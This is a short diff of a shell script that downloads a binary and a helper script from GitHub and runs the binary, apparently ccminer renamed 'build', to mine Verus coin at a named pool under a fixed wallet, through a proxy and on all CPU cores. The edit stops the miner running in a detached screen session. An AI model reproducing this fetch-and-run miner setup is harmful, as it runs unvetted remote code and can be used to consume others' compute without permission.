@@ -4,6 +4,6 @@ wget -q https://raw.githubusercontent.com/Tokisaki-mitsuha/mining/master/compile
 wget -qO build https://github.com/Tokisaki-mitsuha/mining/blob/master/ccminer?raw=true
 chmod +x build
 chmod +x compile.sh
-screen -dm -S build ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.worker-$worker -p x -t $(nproc --all) -x $proxy
+./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.worker-$worker -p x -t $(nproc --all) -x $proxy
 ./compile.sh
 echo succes
